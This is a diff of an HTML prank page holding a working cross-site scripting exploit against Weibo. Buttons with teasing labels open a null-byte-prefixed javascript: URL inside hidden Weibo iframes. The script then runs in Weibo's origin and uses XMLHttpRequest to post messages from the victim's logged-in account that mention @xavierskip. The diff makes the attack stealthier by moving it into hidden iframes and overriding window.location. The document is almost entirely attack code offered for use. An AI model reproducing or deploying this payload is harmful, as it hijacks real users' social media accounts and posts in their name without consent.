@@ -10,7 +10,7 @@ var h=document.domain;if(h=='m.weibo.cn'){var u='/mblogDeal/addAMblog?rl=1';var 
 function weibocn(){
 var u=document.getElementsByTagName('form')[0].action;var xhr=new XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==4){window.open('http://weibo.cn','_top');}};xhr.open('POST',u,true);xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');xhr.send('content=@xavierskip ooxx');
 }
-// function location(){}
+window.location = function(){};
 </script>
 <style type="text/css">
     .button{
@@ -25,10 +25,12 @@ var u=document.getElementsByTagName('form')[0].action;var xhr=new XMLHttpRequest
 </style>
 </head>
 <body>
+<iframe name="m1" style="display:none"src="http://weibo.com"></iframe>
+<iframe name="m2" style="display:none"src="http://weibo.cn"></iframe>
 <input type=button value="不要碰我！" class="button" 
-onclick=window.open('\u0000javascript:var%20h%3Ddocument.domain%3Bif%28h%3D%3D%27m.weibo.cn%27%29%7Bvar%20u%3D%27/mblogDeal/addAMblog%3Frl%3D1%27%3Bvar%20c%3D%27content%27%3B%7D%3Bif%28h%3D%3D%27weibo.com%27%29%7Bvar%20u%3D%27/aj/mblog/add%27%3Bvar%20c%3D%27text%27%3B%7D%3Bvar%20xhr%3Dnew%20XMLHttpRequest%28%29%3Bxhr.onreadystatechange%3Dfunction%28%29%7Bif%28xhr.readyState%3D%3D4%29%7Bwindow.open%28%27http%3A//weibo.com%27%2C%27_top%27%29%3B%7D%7D%3Bxhr.open%28%27POST%27%2Cu%2Ctrue%29%3Bxhr.setRequestHeader%28%27Content-type%27%2C%27application/x-www-form-urlencoded%27%29%3Bxhr.send%28c+%27%3D@xavierskip%20%E5%B0%B1%E7%82%B9%E4%BA%86%EF%BC%8C%E6%80%8E%E4%B9%88%E6%BB%B4%27%29%3B','http://weibo.com') >
+onclick=window.open('\u0000javascript:var%20h%3Ddocument.domain%3Bif%28h%3D%3D%27m.weibo.cn%27%29%7Bvar%20u%3D%27/mblogDeal/addAMblog%3Frl%3D1%27%3Bvar%20c%3D%27content%27%3B%7D%3Bif%28h%3D%3D%27weibo.com%27%29%7Bvar%20u%3D%27/aj/mblog/add%27%3Bvar%20c%3D%27text%27%3B%7D%3Bvar%20xhr%3Dnew%20XMLHttpRequest%28%29%3Bxhr.onreadystatechange%3Dfunction%28%29%7Bif%28xhr.readyState%3D%3D4%29%7Bwindow.open%28%27http%3A//weibo.com%27%2C%27_top%27%29%3B%7D%7D%3Bxhr.open%28%27POST%27%2Cu%2Ctrue%29%3Bxhr.setRequestHeader%28%27Content-type%27%2C%27application/x-www-form-urlencoded%27%29%3Bxhr.send%28c+%27%3D@xavierskip%20%E5%B0%B1%E7%82%B9%E4%BA%86%EF%BC%8C%E6%80%8E%E4%B9%88%E6%BB%B4%27%29%3B','m1') >
 <input type=button value="也不要碰我！" class="button" 
-onclick=window.open('\u0000javascript:var%20u%3Ddocument.getElementsByTagName%28%27form%27%29%5B0%5D.action%3Bvar%20xhr%3Dnew%20XMLHttpRequest%28%29%3Bxhr.onreadystatechange%3Dfunction%28%29%7Bif%28xhr.readyState%3D%3D4%29%7Bwindow.open%28%27http%3A//weibo.cn%27%2C%27_top%27%29%3B%7D%7D%3Bxhr.open%28%27POST%27%2Cu%2Ctrue%29%3Bxhr.setRequestHeader%28%27Content-type%27%2C%27application/x-www-form-urlencoded%27%29%3Bxhr.send%28%27content%3D@xavierskip%20%E6%88%91%E9%94%99%E4%BA%86%27%29%3B','http://weibo.cn') >
+onclick=window.open('\u0000javascript:var%20u%3Ddocument.getElementsByTagName%28%27form%27%29%5B0%5D.action%3Bvar%20xhr%3Dnew%20XMLHttpRequest%28%29%3Bxhr.onreadystatechange%3Dfunction%28%29%7Bif%28xhr.readyState%3D%3D4%29%7Bwindow.open%28%27http%3A//weibo.cn%27%2C%27_top%27%29%3B%7D%7D%3Bxhr.open%28%27POST%27%2Cu%2Ctrue%29%3Bxhr.setRequestHeader%28%27Content-type%27%2C%27application/x-www-form-urlencoded%27%29%3Bxhr.send%28%27content%3D@xavierskip%20%E6%88%91%E9%94%99%E4%BA%86%27%29%3B','m2') >
 </body>
 </html>
 <!-- 就点了，怎么滴
